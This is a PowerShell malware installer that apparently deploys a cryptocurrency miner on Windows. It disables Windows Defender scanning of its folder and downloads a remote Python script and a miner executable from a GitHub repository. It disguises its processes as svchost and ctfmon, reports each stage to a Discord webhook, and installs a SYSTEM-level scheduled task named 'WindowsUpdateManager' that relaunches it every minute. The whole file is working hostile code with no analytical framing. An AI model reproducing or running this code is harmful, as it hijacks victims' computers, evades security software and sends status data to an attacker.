# --- THE GHOST MASTER (VERSION 6.5 - TRUE APEX LANDING) ---
$WEBHOOK = "https://discord.com/api/webhooks/1505276877214847067/v4AWiiLhBWwcL7P_uCjpFfBo122JWqI6_54pYtphp86YRt_ABvMSJOzPxj0vkqlEMte5"
function Send-Ghost { param($msg) try { $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

$ID = "svchost"
$Path = "$env:APPDATA\$ID"
$PY_MASK = "$Path\python\ctfmon.exe"
$LibPath = "$Path\python\Lib\site-packages"

# --- STEP 0: THE GHOST CHECK (Idempotency & Path Alignment) ---
if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }
Set-Location -Path $Path

# Don't restart if we're already running the masked process from this path
if (Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }) { exit }

if (Test-Path $PY_MASK) {
    $env:PYTHONPATH = $LibPath
    Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path -WindowStyle Hidden
    Send-Ghost "Hydra Re-Engaged from Disk on $($env:COMPUTERNAME)"
    exit
}

Send-Ghost "Engine Landing Initiated on $($env:COMPUTERNAME)"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. Clear & Exclusion (Your original ACL cleansing logic)
if (Test-Path $Path) { 
    try {
        # Restore permissions so we can clean the nest
        $Acl = Get-Acl $Path
        $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","Delete,DeleteSubdirectoriesAndFiles","Deny")
        $Acl.RemoveAccessRule($Ar)
        Set-Acl $Path $Acl
    } catch {}
    
    # Kill any existing miners or ghosts in this folder
    $OurProc = Get-Process -Name $ID -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }
    if ($OurProc) { Stop-Process -Id $OurProc.Id -Force -ErrorAction SilentlyContinue }
    
    # Wipe the slate for a fresh graft
    Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue 
}

New-Item -ItemType Directory -Path $Path -Force | Out-Null
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 2. Python Core Landing (The Lungs)
Send-Ghost "Downloading Lungs..."
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip" -OutFile "$Path\py.zip"
Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
Remove-Item "$Path\py.zip"

# 3. THE "LUNGS" FIX (The import site graft)
$PthFile = Get-ChildItem -Path "$Path\python" -Filter "*._pth" | Select-Object -First 1
if ($PthFile) { Add-Content -Path $PthFile.FullName -Value "import site" }

New-Item -ItemType Directory -Path $LibPath -Force | Out-Null
Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "$Path\get-pip.py"
& "$Path\python\python.exe" "$Path\get-pip.py" --no-warn-script-location
& "$Path\python\python.exe" -m pip install requests psutil --target "$LibPath" --no-warn-script-location

# 4. Payload Landing & Robust Extraction
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/UpdataData.bin"
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.zip"

if (Test-Path "$Path\UpdataData.zip") {
    Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath "$Path\temp_bin" -Force
    $Miner = Get-ChildItem -Path "$Path\temp_bin" -Filter "*.exe" -Recurse | Select-Object -First 1
    if ($Miner) { 
        Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force 
        Send-Ghost "Miner mask applied: $ID.exe"
    }
    Remove-Item -Path "$Path\temp_bin" -Recurse -Force
}

# 5. ACTIVATION & RESURRECTION (Your original Resurrection logic + Fixed Quoting)
if (Test-Path "$Path\python\pythonw.exe") {
    Rename-Item -Path "$Path\python\pythonw.exe" -NewName "ctfmon.exe" -Force
    
    # Ensure the task creates properly with the SYSTEM account
    $TaskArgs = "/create /tn `"WindowsUpdateManager`" /tr `"\`"$PY_MASK\`" \`"$Path\WinServices.py\`" --id $ID`" /sc minute /mo 1 /ru `"SYSTEM`" /f"
    Start-Process -FilePath "schtasks.exe" -ArgumentList $TaskArgs -WindowStyle Hidden -Wait

    $env:PYTHONPATH = $LibPath
    Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WorkingDirectory $Path -WindowStyle Hidden
    Send-Ghost "Hydra Released. Resurrection Active on $($env:COMPUTERNAME)."
}

# Final Cleanup
Remove-Item -Path "$Path\get-pip.py", "$Path\UpdataData.zip" -ErrorAction SilentlyContinue
